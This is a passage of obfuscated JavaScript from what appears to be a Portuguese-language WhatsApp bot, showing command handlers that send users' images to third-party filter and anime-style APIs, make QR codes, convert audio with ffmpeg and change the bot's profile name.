                  return _0x403602("Erro ao obter a imagem da API talvez caiu.. tente mais tarde manin.", _0x18faed);
                }
              } else {
                const _0xfff6c7 = {
                  quoted: _0x302296
                };
                _0x403602("Selecione uma imagem para transformar.", _0xfff6c7);
              }
              break;
            case "fotoanime":
            case "toanime":
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                const _0x3339d7 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                const _0x2dc328 = await downloadContentFromMessage(_0x3339d7, "image");
                let _0x21bdf0 = Buffer.from([]);
                for await (const _0x2d753b of _0x2dc328) {
                  _0x21bdf0 = Buffer.concat([_0x21bdf0, _0x2d753b]);
                }
                const _0x1c5861 = {
                  quoted: _0x302296
                };
                _0x403602(enviar.espere, _0x1c5861);
                const _0x1be23e = await upload(_0x21bdf0);
                try {
                  const _0x5137f7 = {
                    url: SITE_JEFF_APIS + "/api/ia/toanime?link=" + _0x1be23e + "&apikey=" + _0x512d5e
                  };
                  const _0x18effb = {
                    image: _0x5137f7,
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x18effb).catch(_0x268149 => {
                    console.error("Erro ao enviar a imagem:", _0x268149);
                    const _0x3ed133 = {
                      quoted: _0x302296
                    };
                    return _0x403602("Erro ao enviar a imagem. =(", _0x3ed133);
                  });
                } catch (_0x8af4fe) {
                  console.error("Erro ao obter a imagem da API:", _0x8af4fe);
                  const _0x1bcf7f = {
                    quoted: _0x302296
                  };
                  return _0x403602("Erro ao obter a imagem da API talvez caiu.. tente mais tarde manin.", _0x1bcf7f);
                }
              } else {
                const _0x288bbb = {
                  quoted: _0x302296
                };
                _0x403602("Selecione uma imagem para transformar.", _0x288bbb);
              }
              break;
            case "fotozombie":
            case "tozombie":
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                const _0x3018b9 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                const _0x475987 = await downloadContentFromMessage(_0x3018b9, "image");
                let _0x39f1f0 = Buffer.from([]);
                for await (const _0x576ad6 of _0x475987) {
                  _0x39f1f0 = Buffer.concat([_0x39f1f0, _0x576ad6]);
                }
                const _0x6a3eb0 = {
                  quoted: _0x302296
                };
                _0x403602(enviar.espere, _0x6a3eb0);
                const _0x5175bf = await upload(_0x39f1f0);
                try {
                  const _0x534775 = await fetch(SITE_JEFF_APIS + "/api/ia/tozombie?link=" + _0x5175bf + "&apikey=" + _0x512d5e);
                  const _0x22acc4 = await _0x534775.json();
                  const _0x425fd8 = _0x22acc4.resultado.imagem;
                  const _0x4f2c45 = {
                    url: _0x425fd8
                  };
                  const _0x134917 = {
                    image: _0x4f2c45,
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x134917).catch(_0x25db78 => {
                    console.error("Erro ao enviar a imagem:", _0x25db78);
                    const _0x573052 = {
                      quoted: _0x302296
                    };
                    return _0x403602("Erro ao enviar a imagem. =(", _0x573052);
                  });
                } catch (_0x23223f) {
                  console.error("Erro ao obter a imagem da API:", _0x23223f);
                  const _0x11593b = {
                    quoted: _0x302296
                  };
                  return _0x403602("Erro ao obter a imagem da API talvez caiu.. tente mais tarde manin.", _0x11593b);
                }
              } else {
                const _0x24fc0a = {
                  quoted: _0x302296
                };
                _0x403602("Selecione uma imagem para transformar.", _0x24fc0a);
              }
              break;
            case "fotogta":
            case "togta":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x425edc = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x32c0bb = await downloadContentFromMessage(_0x425edc, "image");
                  let _0xf78008 = Buffer.from([]);
                  for await (const _0x58ae88 of _0x32c0bb) {
                    _0xf78008 = Buffer.concat([_0xf78008, _0x58ae88]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x300995 = await upload(_0xf78008);
                  const _0x442c13 = SITE_JEFF_APIS + "/api/ia/togta?link=" + _0x300995 + "&apikey=" + _0x512d5e;
                  const _0x21700b = {
                    url: _0x442c13
                  };
                  const _0x8f4ae3 = {
                    image: _0x21700b
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x8f4ae3);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x58388d) {
                console.error("Erro:", _0x58388d);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "nomewpp":
              if (!_0x2a5ff3) {
                return;
              }
              await _0x263319.updateProfileName("" + _0x1d6557);
              break;
            case "audvizu":
              if (!_0x6aebb1) {
                return _0x403602("Marque um áudio");
              }
              _0x403602("Aguarde...");
              muka = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
              rane = getRandom("." + (await getExtension(muka.mimetype)));
              buffimga = await getFileBuffer(muka, "audio");
              fs.writeFileSync(rane, buffimga);
              gem = rane;
              ran = getRandom(".mp3");
              exec("ffmpeg -i " + gem + " " + ran, (_0x43cba2, _0x5cea6a, _0x26ce5c) => {
                fs.unlinkSync(gem);
                if (_0x43cba2) {
                  return _0x403602("Erro ao processar o áudio!");
                }
                hahia = fs.readFileSync(ran);
                const _0x18ad50 = {
                  audio: hahia,
                  mimetype: "audio/mp4",
                  viewOnce: true
                };
                const _0x1c3afd = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x18ad50, _0x1c3afd);
                fs.unlinkSync(ran);
              });
              break;
            case "diz":
              if (!_0x2a5ff3) {
                return;
              }
              _0x403602("" + _0x1d6557);
              break;
            case "qrcode":
              const _0x29f6b3 = encodeURIComponent(_0x2e320b.slice(8));
              if (!_0x29f6b3) {
                return _0x403602("Digite um texto/url que deseja criar um código qr");
              }
              const _0x292780 = await getBuffer("https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=" + _0x29f6b3);
              const _0x3aab1e = {
                image: _0x292780
              };
              const _0xd3633b = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x3aab1e, _0xd3633b);
              break;
            case "fotocartoon":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x1a6e6d = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0xe437c1 = await downloadContentFromMessage(_0x1a6e6d, "image");
                  let _0x47ec35 = Buffer.from([]);
                  for await (const _0x32686c of _0xe437c1) {
                    _0x47ec35 = Buffer.concat([_0x47ec35, _0x32686c]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x267781 = await upload(_0x47ec35);
                  const _0x523281 = "" + lolhuman;
                  const _0x12d0c3 = "https://api.lolhuman.xyz/api/editor/cartoon?apikey=" + _0x523281 + "&img=" + _0x267781;
                  const _0x193a52 = {
                    url: _0x12d0c3
                  };
                  const _0x39ae56 = {
                    image: _0x193a52
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x39ae56);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x16d594) {
                console.error("Erro:", _0x16d594);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotohd3":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x480583 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x31364d = await downloadContentFromMessage(_0x480583, "image");
                  let _0x38d724 = Buffer.from([]);
                  for await (const _0x487334 of _0x31364d) {
                    _0x38d724 = Buffer.concat([_0x38d724, _0x487334]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x470eec = await upload(_0x38d724);
                  const _0x121c98 = "" + lolhuman;
                  const _0x429992 = "https://api.lolhuman.xyz/api/upscale?apikey=" + _0x121c98 + "&img=" + _0x470eec;
                  const _0x402f24 = {
                    url: _0x429992
                  };
                  const _0x753570 = {
                    image: _0x402f24
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x753570);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x40a41c) {
                console.error("Erro:", _0x40a41c);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotoslumber":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x10ff5a = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x27973b = await downloadContentFromMessage(_0x10ff5a, "image");
                  let _0x2c7319 = Buffer.from([]);
                  for await (const _0x711ee7 of _0x27973b) {
                    _0x2c7319 = Buffer.concat([_0x2c7319, _0x711ee7]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x4e87cb = await upload(_0x2c7319);
                  const _0x284412 = "" + lolhuman;
                  const _0x42ef46 = "https://api.lolhuman.xyz/api/filter/slumber?apikey=" + _0x284412 + "&img=" + _0x4e87cb;
                  const _0x5ed45a = {
                    url: _0x42ef46
                  };
                  const _0x464e8e = {
                    image: _0x5ed45a
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x464e8e);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x2e5099) {
                console.error("Erro:", _0x2e5099);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "foto1977":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x4f8e18 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x3f24ba = await downloadContentFromMessage(_0x4f8e18, "image");
                  let _0x629515 = Buffer.from([]);
                  for await (const _0x37a184 of _0x3f24ba) {
                    _0x629515 = Buffer.concat([_0x629515, _0x37a184]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x5e165f = await upload(_0x629515);
                  const _0x35646b = "" + lolhuman;
                  const _0x1bf84f = "https://api.lolhuman.xyz/api/filter/1977?apikey=" + _0x35646b + "&img=" + _0x5e165f;
                  const _0xbb6800 = {
                    url: _0x1bf84f
                  };
                  const _0x56bf23 = {
                    image: _0xbb6800
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x56bf23);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x5593e2) {
                console.error("Erro:", _0x5593e2);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotoaden":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x3ec171 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x5eabd1 = await downloadContentFromMessage(_0x3ec171, "image");
                  let _0x5458bb = Buffer.from([]);
                  for await (const _0x4ec6df of _0x5eabd1) {
                    _0x5458bb = Buffer.concat([_0x5458bb, _0x4ec6df]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x233534 = await upload(_0x5458bb);
                  const _0x3708b1 = "" + lolhuman;
                  const _0x171540 = "https://api.lolhuman.xyz/api/filter/aden?/aden?apikey=" + _0x3708b1 + "&img=" + _0x233534;
                  const _0xec2495 = {
                    url: _0x171540
                  };
                  const _0x58211c = {
                    image: _0xec2495
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x58211c);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x194d5a) {
                console.error("Erro:", _0x194d5a);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotobrannan":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x616c0c = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x422852 = await downloadContentFromMessage(_0x616c0c, "image");
                  let _0x324261 = Buffer.from([]);
                  for await (const _0x28c298 of _0x422852) {
                    _0x324261 = Buffer.concat([_0x324261, _0x28c298]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x361535 = await upload(_0x324261);
                  const _0x1ae00c = "" + lolhuman;
                  const _0x1c8f3e = "https://api.lolhuman.xyz/api/filter/brannan?apikey=" + _0x1ae00c + "&img=" + _0x361535;
                  const _0x5b55c4 = {
                    url: _0x1c8f3e
                  };
                  const _0x2685fd = {
                    image: _0x5b55c4
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x2685fd);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x53d27d) {
                console.error("Erro:", _0x53d27d);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotobXbotklyn":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x32e923 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x5f59a3 = await downloadContentFromMessage(_0x32e923, "image");
                  let _0x349691 = Buffer.from([]);
                  for await (const _0x32c3a6 of _0x5f59a3) {
                    _0x349691 = Buffer.concat([_0x349691, _0x32c3a6]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x1a682e = await upload(_0x349691);
                  const _0x32695a = "" + lolhuman;
                  const _0x3d82a1 = "https://api.lolhuman.xyz/api/filter/bXbotklyn?apikey=" + _0x32695a + "&img=" + _0x1a682e;
                  const _0x1f5b60 = {
                    url: _0x3d82a1
                  };
                  const _0x5a2147 = {
                    image: _0x1f5b60
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x5a2147);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x40176b) {
                console.error("Erro:", _0x40176b);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotoclarendon":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x340f35 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x49ab12 = await downloadContentFromMessage(_0x340f35, "image");
                  let _0x5cdd83 = Buffer.from([]);
                  for await (const _0x10041c of _0x49ab12) {
                    _0x5cdd83 = Buffer.concat([_0x5cdd83, _0x10041c]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x12230e = await upload(_0x5cdd83);
                  const _0x406d4d = "" + lolhuman;
                  const _0x53f391 = "https://api.lolhuman.xyz/api/filter/clarendon?apikey=" + _0x406d4d + "&img=" + _0x12230e;
                  const _0x23869e = {
                    url: _0x53f391
                  };
                  const _0x4fac37 = {
                    image: _0x23869e
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x4fac37);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x4c40c4) {
                console.error("Erro:", _0x4c40c4);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotoearlybird":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x276db1 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x5c6f19 = await downloadContentFromMessage(_0x276db1, "image");
                  let _0x4a1b8b = Buffer.from([]);
                  for await (const _0x356a49 of _0x5c6f19) {
                    _0x4a1b8b = Buffer.concat([_0x4a1b8b, _0x356a49]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x5164a3 = await upload(_0x4a1b8b);
                  const _0x1cb03c = "" + lolhuman;
                  const _0x1de03e = "https://api.lolhuman.xyz/api/filter/earlybird?apikey=" + _0x1cb03c + "&img=" + _0x5164a3;
                  const _0x2f1f9f = {
                    url: _0x1de03e
                  };
                  const _0x1dff7e = {
                    image: _0x2f1f9f
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x1dff7e);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x47cdeb) {
                console.error("Erro:", _0x47cdeb);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotogingham":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x16064c = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0xe8c252 = await downloadContentFromMessage(_0x16064c, "image");
                  let _0x540a40 = Buffer.from([]);
                  for await (const _0x2e5370 of _0xe8c252) {
                    _0x540a40 = Buffer.concat([_0x540a40, _0x2e5370]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x2f8a5a = await upload(_0x540a40);
                  const _0x502cc4 = "" + lolhuman;
                  const _0x5d1a19 = "https://api.lolhuman.xyz/api/filter/gingham?apikey=" + _0x502cc4 + "&img=" + _0x2f8a5a;
                  const _0xa4d714 = {
                    url: _0x5d1a19
                  };
                  const _0xa3df21 = {
                    image: _0xa4d714
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0xa3df21);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x39b529) {
                console.error("Erro:", _0x39b529);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotohudson":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x29b8d8 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x576074 = await downloadContentFromMessage(_0x29b8d8, "image");
                  let _0x42317c = Buffer.from([]);
                  for await (const _0x32b1a3 of _0x576074) {
                    _0x42317c = Buffer.concat([_0x42317c, _0x32b1a3]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x6a1831 = await upload(_0x42317c);
                  const _0x580754 = "" + lolhuman;
                  const _0x486c8c = "https://api.lolhuman.xyz/api/filter/hudson?apikey=" + _0x580754 + "&img=" + _0x6a1831;
                  const _0x46c2d3 = {
                    url: _0x486c8c
                  };
                  const _0x41ed58 = {
                    image: _0x46c2d3
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x41ed58);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x5c1815) {
                console.error("Erro:", _0x5c1815);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotosinkwell":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x38d3f1 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x5906c0 = await downloadContentFromMessage(_0x38d3f1, "image");
                  let _0x12f3da = Buffer.from([]);
                  for await (const _0xd01fa8 of _0x5906c0) {
                    _0x12f3da = Buffer.concat([_0x12f3da, _0xd01fa8]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x50949e = await upload(_0x12f3da);
                  const _0xe9c47f = "" + lolhuman;
                  const _0x288ffa = "https://api.lolhuman.xyz/api/filter/inkwell?apikey=" + _0xe9c47f + "&img=" + _0x50949e;
                  const _0x181ccf = {
                    url: _0x288ffa
                  };
                  const _0xc71156 = {
                    image: _0x181ccf
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0xc71156);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x3e7e0a) {
                console.error("Erro:", _0x3e7e0a);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotokelvin":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0xbc5e27 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x1b0841 = await downloadContentFromMessage(_0xbc5e27, "image");
                  let _0x46cf35 = Buffer.from([]);
                  for await (const _0x2cd3e2 of _0x1b0841) {
                    _0x46cf35 = Buffer.concat([_0x46cf35, _0x2cd3e2]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x1d7956 = await upload(_0x46cf35);
                  const _0xc450ed = "" + lolhuman;
                  const _0x1c46b9 = "https://api.lolhuman.xyz/api/filter/kelvin?apikey=" + _0xc450ed + "&img=" + _0x1d7956;
                  const _0x5e7443 = {
                    url: _0x1c46b9
                  };
                  const _0x24a746 = {
                    image: _0x5e7443
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x24a746);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x1ecf69) {
                console.error("Erro:", _0x1ecf69);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotolark":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x1e8ec2 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x12a02d = await downloadContentFromMessage(_0x1e8ec2, "image");
                  let _0x5050b2 = Buffer.from([]);
                  for await (const _0x136c02 of _0x12a02d) {
                    _0x5050b2 = Buffer.concat([_0x5050b2, _0x136c02]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x1f7b87 = await upload(_0x5050b2);
                  const _0x5f5218 = "" + lolhuman;
                  const _0x4662ac = "https://api.lolhuman.xyz/api/filter/lark?apikey=" + _0x5f5218 + "&img=" + _0x1f7b87;
                  const _0x3e0df6 = {
                    url: _0x4662ac
                  };
                  const _0x3ae0f2 = {
                    image: _0x3e0df6
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x3ae0f2);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x135927) {
                console.error("Erro:", _0x135927);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotoslofi":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x4164a3 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x419cf9 = await downloadContentFromMessage(_0x4164a3, "image");
                  let _0x223a26 = Buffer.from([]);
                  for await (const _0x2d25f9 of _0x419cf9) {
                    _0x223a26 = Buffer.concat([_0x223a26, _0x2d25f9]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x212120 = await upload(_0x223a26);
                  const _0x128600 = "" + lolhuman;
                  const _0x5ab2cc = "https://api.lolhuman.xyz/api/filter/lofi?apikey=" + _0x128600 + "&img=" + _0x212120;
                  const _0x8e81d7 = {
                    url: _0x5ab2cc
                  };
                  const _0x184e0a = {
                    image: _0x8e81d7
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x184e0a);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x5f4807) {
                console.error("Erro:", _0x5f4807);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotomaven":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x1e544c = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x3f581b = await downloadContentFromMessage(_0x1e544c, "image");
                  let _0x42a13f = Buffer.from([]);
                  for await (const _0x5bdc29 of _0x3f581b) {
                    _0x42a13f = Buffer.concat([_0x42a13f, _0x5bdc29]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x858c55 = await upload(_0x42a13f);
                  const _0x1d9e73 = "" + lolhuman;
                  const _0x4fee1b = "https://api.lolhuman.xyz/api/filter/maven?apikey=" + _0x1d9e73 + "&img=" + _0x858c55;
                  const _0x53c4b9 = {
                    url: _0x4fee1b
                  };
                  const _0x493eeb = {
                    image: _0x53c4b9
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x493eeb);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x37c6ff) {
                console.error("Erro:", _0x37c6ff);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotomayfair":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x5b7d58 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x321df1 = await downloadContentFromMessage(_0x5b7d58, "image");
                  let _0x771f9c = Buffer.from([]);
                  for await (const _0x1a6de9 of _0x321df1) {
                    _0x771f9c = Buffer.concat([_0x771f9c, _0x1a6de9]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x5d23cc = await upload(_0x771f9c);
                  const _0xe75047 = "" + lolhuman;
                  const _0x4080fc = "https://api.lolhuman.xyz/api/filter/mayfair?apikey=" + _0xe75047 + "&img=" + _0x5d23cc;
                  const _0x3d9a03 = {
                    url: _0x4080fc
                  };
                  const _0x2e29ef = {
                    image: _0x3d9a03
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x2e29ef);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x58e624) {
                console.error("Erro:", _0x58e624);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotomoon":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x503a3a = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x352b6c = await downloadContentFromMessage(_0x503a3a, "image");
                  let _0x3b8a09 = Buffer.from([]);
                  for await (const _0x2a62f4 of _0x352b6c) {
                    _0x3b8a09 = Buffer.concat([_0x3b8a09, _0x2a62f4]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0xd890b2 = await upload(_0x3b8a09);
                  const _0x1eb6db = "" + lolhuman;
                  const _0x4e3f6b = "https://api.lolhuman.xyz/api/filter/moon?apikey=" + _0x1eb6db + "&img=" + _0xd890b2;
                  const _0x171eac = {
                    url: _0x4e3f6b
                  };
                  const _0x4edbd4 = {
                    image: _0x171eac
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x4edbd4);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x65f3df) {
                console.error("Erro:", _0x65f3df);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotonashville":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x3118b3 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x305d6d = await downloadContentFromMessage(_0x3118b3, "image");
                  let _0x1700ca = Buffer.from([]);
                  for await (const _0x110de0 of _0x305d6d) {
                    _0x1700ca = Buffer.concat([_0x1700ca, _0x110de0]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x47db8a = await upload(_0x1700ca);
                  const _0x7d59e1 = "" + lolhuman;
                  const _0x33318d = "https://api.lolhuman.xyz/api/filter/nashville?apikey=" + _0x7d59e1 + "&img=" + _0x47db8a;
                  const _0x55b741 = {
                    url: _0x33318d
                  };
                  const _0x4b7e70 = {
                    image: _0x55b741
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x4b7e70);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x223c93) {
                console.error("Erro:", _0x223c93);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotoperpetua":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x322097 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x18ff0f = await downloadContentFromMessage(_0x322097, "image");
                  let _0x5ebeed = Buffer.from([]);
                  for await (const _0x5c6ebc of _0x18ff0f) {
                    _0x5ebeed = Buffer.concat([_0x5ebeed, _0x5c6ebc]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x458dee = await upload(_0x5ebeed);
                  const _0x4d0951 = "" + lolhuman;
                  const _0x2f2cd3 = "https://api.lolhuman.xyz/api/filter/perpetua?apikey=" + _0x4d0951 + "&img=" + _0x458dee;
                  const _0x5620ab = {
                    url: _0x2f2cd3
                  };
                  const _0x32a9cf = {
                    image: _0x5620ab
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x32a9cf);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x185cf5) {
                console.error("Erro:", _0x185cf5);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotoreyes":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
